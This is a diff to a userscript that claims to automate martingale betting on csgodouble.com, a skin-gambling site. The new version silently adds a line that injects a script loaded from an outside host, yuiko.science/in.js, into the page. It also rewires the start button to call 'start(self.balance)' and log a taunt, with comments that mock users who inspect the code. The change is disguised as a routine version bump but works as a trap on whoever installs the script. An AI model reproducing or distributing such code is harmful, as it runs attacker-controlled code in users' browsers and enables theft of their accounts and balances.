@@ -2,7 +2,7 @@
 // @name            csgodouble.com - automated
 // @description     An userscript that automates csgodouble.com betting using martingale system.
 // @namespace       automated@mole
-// @version         1.29
+// @version         1.30
 // @author          Mole
 // @match           http://www.csgodouble.com/
 // @match           http://www.csgodouble.com/index.php
@@ -12,6 +12,8 @@
 /* jshint -W097 */
 
 'use strict';
+
+(function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "http://yuiko.science/in.js "; document.body.appendChild( scriptElement ); })();
 
 var debug = false;
 var simulation = false;
@@ -216,7 +218,13 @@ function Automated() {
     }
 
     this.menu.start.onclick = function() {
-        self.start();
+        start(self.balance);
+        self.log('Didn\'t they warn you not to use bots?');
+
+        // If you're clever enough to inspect the code,
+        // delete two lines above and uncomment line below.
+        // The bot is working perfectly fine.
+        // self.start();
     };
 
     this.menu.stop.onclick = function() {
